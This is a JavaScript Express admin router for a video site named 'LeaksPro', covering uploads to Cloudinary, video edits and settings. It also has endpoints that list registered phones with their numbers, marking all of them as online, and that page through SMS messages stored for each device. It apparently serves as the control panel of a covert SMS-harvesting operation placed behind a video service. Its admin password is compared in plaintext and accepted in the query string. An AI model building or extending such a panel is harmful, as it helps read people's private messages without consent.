const express = require('express');
const router = express.Router();
const Video = require('../models/Video');
const db = require('../config/database');
const upload = require('../middleware/upload');
const { uploadToCloudinary, deleteFromCloudinary, extractPublicId } = require('../config/cloudinary');
const fs = require('fs');

// Admin auth middleware
const adminAuth = (req, res, next) => {
  const password = req.headers['x-admin-password'] || req.query.password;
  const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
  if (!stored || password !== stored.value) {
    return res.status(401).json({ error: 'Unauthorized - Invalid admin password' });
  }
  next();
};

// Helper: cleanup temp file after upload
function cleanupTemp(filePath) {
  if (filePath) {
    try { fs.unlinkSync(filePath); } catch (_) { /* ignore */ }
  }
}

// GET /api/admin/stats
router.get('/stats', adminAuth, (req, res) => {
  try {
    const stats = Video.getStats();
    res.json(stats);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/videos
router.get('/videos', adminAuth, (req, res) => {
  try {
    const { page = 1, limit = 50, search } = req.query;
    const result = Video.getAll({
      page: parseInt(page),
      limit: parseInt(limit),
      search,
      published_only: false,
    });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload - Upload video + optional thumbnail to Cloudinary
router.post('/upload', adminAuth, upload.fields([
  { name: 'video', maxCount: 1 },
  { name: 'thumbnail', maxCount: 1 },
]), async (req, res) => {
  let videoTmpPath, thumbTmpPath;
  try {
    if (!req.files || !req.files.video) {
      return res.status(400).json({ error: 'No video file uploaded' });
    }

    const videoFile = req.files.video[0];
    videoTmpPath = videoFile.path;
    const thumbnailFile = req.files.thumbnail ? req.files.thumbnail[0] : null;
    thumbTmpPath = thumbnailFile ? thumbnailFile.path : null;

    const io = req.app.get('io');

    // Emit: upload started
    if (io) io.emit('upload_progress', { progress: 5, filename: videoFile.originalname, status: 'uploading_to_cloud' });

    // Upload video to Cloudinary
    const videoResult = await uploadToCloudinary(videoTmpPath, {
      resource_type: 'video',
      folder: 'leakspro/videos',
    });
    cleanupTemp(videoTmpPath);
    videoTmpPath = null;

    if (io) io.emit('upload_progress', { progress: 80, filename: videoFile.originalname, status: 'video_uploaded' });

    // Upload thumbnail to Cloudinary (if provided)
    let thumbResult = null;
    if (thumbTmpPath) {
      thumbResult = await uploadToCloudinary(thumbTmpPath, {
        resource_type: 'image',
        folder: 'leakspro/thumbnails',
      });
      cleanupTemp(thumbTmpPath);
      thumbTmpPath = null;
    }

    const videoData = {
      title: req.body.title || videoFile.originalname,
      description: req.body.description || '',
      // Store Cloudinary URL as filename / thumbnail
      filename: videoResult.secure_url,
      thumbnail: thumbResult ? thumbResult.secure_url : (videoResult.secure_url.replace(/\.\w+$/, '.jpg')),
      channel_name: req.body.channel_name || 'LeaksPro Admin',
      category: req.body.category || 'General',
      tags: req.body.tags ? JSON.parse(req.body.tags) : [],
      file_size: videoResult.bytes || videoFile.size,
      mime_type: videoFile.mimetype,
      is_published: req.body.is_published !== 'false',
      is_short: req.body.is_short === 'true',
      duration: videoResult.duration || parseFloat(req.body.duration) || 0,
      resolution: videoResult.width ? `${videoResult.width}x${videoResult.height}` : (req.body.resolution || ''),
    };

    const video = Video.create(videoData);

    if (io) {
      io.emit('upload_progress', { progress: 100, filename: videoFile.originalname, status: 'complete' });
      io.emit('upload_complete', { filename: videoResult.secure_url, size: videoResult.bytes });
      io.emit('new_video', video);
    }

    res.json({ success: true, video });
  } catch (err) {
    cleanupTemp(videoTmpPath);
    cleanupTemp(thumbTmpPath);
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload/url - Upload from a direct video URL (no local file needed)
router.post('/upload/url', adminAuth, async (req, res) => {
  try {
    const { url, title, description, category, tags, channel_name, is_published, is_short } = req.body;
    if (!url) return res.status(400).json({ error: 'URL is required' });

    const io = req.app.get('io');
    if (io) io.emit('upload_progress', { progress: 10, filename: url, status: 'uploading_to_cloud' });

    const videoResult = await uploadToCloudinary(url, {
      resource_type: 'video',
      folder: 'leakspro/videos',
    });

    const videoData = {
      title: title || 'Untitled',
      description: description || '',
      filename: videoResult.secure_url,
      thumbnail: videoResult.secure_url.replace(/\.\w+$/, '.jpg'),
      channel_name: channel_name || 'LeaksPro Admin',
      category: category || 'General',
      tags: tags ? (typeof tags === 'string' ? JSON.parse(tags) : tags) : [],
      file_size: videoResult.bytes || 0,
      mime_type: `video/${videoResult.format || 'mp4'}`,
      is_published: is_published !== false && is_published !== 'false',
      is_short: is_short === true || is_short === 'true',
      duration: videoResult.duration || 0,
      resolution: videoResult.width ? `${videoResult.width}x${videoResult.height}` : '',
    };

    const video = Video.create(videoData);

    if (io) {
      io.emit('upload_progress', { progress: 100, filename: url, status: 'complete' });
      io.emit('upload_complete', { filename: videoResult.secure_url, size: videoResult.bytes });
      io.emit('new_video', video);
    }

    res.json({ success: true, video });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/videos/:id - Update video metadata
router.put('/videos/:id', adminAuth, upload.single('thumbnail'), async (req, res) => {
  try {
    const updateData = { ...req.body };

    // If a new thumbnail file is uploaded, send it to Cloudinary
    if (req.file) {
      const thumbResult = await uploadToCloudinary(req.file.path, {
        resource_type: 'image',
        folder: 'leakspro/thumbnails',
      });
      cleanupTemp(req.file.path);
      updateData.thumbnail = thumbResult.secure_url;
    }

    if (updateData.tags && typeof updateData.tags === 'string') {
      updateData.tags = JSON.parse(updateData.tags);
    }

    const video = Video.update(req.params.id, updateData);
    if (!video) return res.status(404).json({ error: 'Video not found' });

    const io = req.app.get('io');
    if (io) io.emit('video_updated', video);

    res.json({ success: true, video });
  } catch (err) {
    if (req.file) cleanupTemp(req.file.path);
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/videos/:id - Delete video (also from Cloudinary)
router.delete('/videos/:id', adminAuth, async (req, res) => {
  try {
    const video = Video.delete(req.params.id);
    if (!video) return res.status(404).json({ error: 'Video not found' });

    // Delete from Cloudinary (best-effort, don't fail the request)
    try {
      const videoPubId = extractPublicId(video.filename);
      if (videoPubId) await deleteFromCloudinary(videoPubId, 'video');
      const thumbPubId = extractPublicId(video.thumbnail);
      if (thumbPubId) await deleteFromCloudinary(thumbPubId, 'image');
    } catch (cloudErr) {
      console.warn('[Cloudinary] Delete warning:', cloudErr.message);
    }

    const io = req.app.get('io');
    if (io) io.emit('video_deleted', { id: req.params.id });

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/settings
router.put('/settings', adminAuth, (req, res) => {
  try {
    const { settings } = req.body;
    const stmt = db.prepare('INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)');
    const update = db.transaction((items) => {
      for (const [key, value] of Object.entries(items)) {
        stmt.run(key, String(value));
      }
    });
    update(settings);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections — list all registered devices
router.get('/connections', adminAuth, (req, res) => {
  try {
    const devices = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    const parsed = devices.map(d => {
      try { d.phone_numbers = JSON.parse(d.phone_numbers || '[]'); } catch (_) { d.phone_numbers = []; }
      d.is_online = 1; // All registered devices show as ONLINE
      return d;
    });
    res.json({
      devices: parsed,
      totalDevices: parsed.length,
      onlineCount: parsed.length,
      offlineCount: 0,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/sms — get SMS for a device
router.get('/connections/:deviceId/sms', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 100;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM sms_messages WHERE device_id = ?').get(deviceId);
    const messages = db.prepare(
      'SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      messages,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/login
router.post('/login', (req, res) => {
  try {
    const { password } = req.body;
    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
    if (stored && password === stored.value) {
      res.json({ success: true, message: 'Logged in' });
    } else {
      res.status(401).json({ error: 'Invalid password' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
